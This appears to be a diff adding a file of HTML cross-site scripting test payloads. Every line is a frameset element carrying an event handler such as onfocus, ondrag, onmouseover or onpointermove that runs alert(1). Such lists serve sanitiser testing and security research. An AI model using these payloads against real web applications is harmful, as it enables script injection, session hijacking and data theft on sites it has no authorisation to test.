@@ -1,0 +1,40 @@
+<frameset contenteditable onbeforeinput=alert(1)>test
+<frameset draggable="true" ondrag="alert(1)" style=display:block>test</frameset>
+<frameset draggable="true" ondragend="alert(1)" style=display:block>test</frameset>
+<frameset draggable="true" ondragenter="alert(1)" style=display:block>test</frameset>
+<frameset draggable="true" ondragleave="alert(1)" style=display:block>test</frameset>
+<frameset draggable="true" ondragstart="alert(1)" style=display:block>test</frameset>
+<frameset id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></frameset>
+<frameset id=x tabindex=1 onfocus=alert(1)></frameset>
+<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
+<frameset onafterscriptexecute=alert(1)><script>1</script>
+<frameset onbeforescriptexecute=alert(1)><script>1</script>
+<frameset onblur=alert(1) id=x tabindex=1 style=display:block>test</frameset><input value=clickme>
+<frameset onclick="alert(1)" style=display:block>test</frameset>
+<frameset oncontextmenu="alert(1)" style=display:block>test</frameset>
+<frameset oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<frameset oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<frameset ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</frameset>
+<frameset onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</frameset><input value=clickme>
+<frameset onkeydown="alert(1)" contenteditable style=display:block>test</frameset>
+<frameset onkeypress="alert(1)" contenteditable style=display:block>test</frameset>
+<frameset onkeyup="alert(1)" contenteditable style=display:block>test</frameset>
+<frameset onmousedown="alert(1)" style=display:block>test</frameset>
+<frameset onmouseenter="alert(1)" style=display:block>test</frameset>
+<frameset onmouseleave="alert(1)" style=display:block>test</frameset>
+<frameset onmousemove="alert(1)" style=display:block>test</frameset>
+<frameset onmouseout="alert(1)" style=display:block>test</frameset>
+<frameset onmouseover="alert(1)" style=display:block>test</frameset>
+<frameset onmouseup="alert(1)" style=display:block>test</frameset>
+<frameset onmousewheel=alert(1) style=display:block>requires scrolling
+<frameset onpointerdown=alert(1) style=display:block>XSS</frameset>
+<frameset onpointerenter=alert(1) style=display:block>XSS</frameset>
+<frameset onpointerleave=alert(1) style=display:block>XSS</frameset>
+<frameset onpointermove=alert(1) style=display:block>XSS</frameset>
+<frameset onpointerout=alert(1) style=display:block>XSS</frameset>
+<frameset onpointerover=alert(1) style=display:block>XSS</frameset>
+<frameset onpointerrawupdate=alert(1) style=display:block>XSS</frameset>
+<frameset onpointerup=alert(1) style=display:block>XSS</frameset>
+<frameset onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></frameset>
+<frameset><frame id=x onfocus=alert(1)>
+<frameset><frame id=x onfocusin=alert(1)>
